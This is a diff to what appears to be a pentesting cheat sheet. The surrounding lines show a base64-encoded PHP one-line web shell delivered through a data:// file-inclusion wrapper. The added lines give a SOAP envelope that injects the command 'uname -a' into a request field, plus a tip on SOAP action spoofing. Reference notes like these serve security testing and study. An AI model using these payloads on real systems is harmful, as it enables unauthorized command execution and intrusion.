@@ -273,6 +273,25 @@ FILE INCLUSION
     echo '<?php system($_GET["cmd"]);   ?>' | base64 -w0
     data://text/plain;base64,<BASE64-STRING>&cmd=id
 
+
+SOAP EXPLOITATION
+
+    #check for `wsdl?wsdl`
+
+    XML Structure for SOAP API
+    <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/"
+    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
+    <soap:Body>
+      <LoginRequest xmlns="http://tempuri.org/">
+        <cmd>
+          uname -a
+        </cmd>
+      </LoginRequest>
+    </soap:Body>
+    </soap:Envelope>
     
+    #Mind this
+    #SOAPSpoofing is when you use method-A with action of method-B
 
     
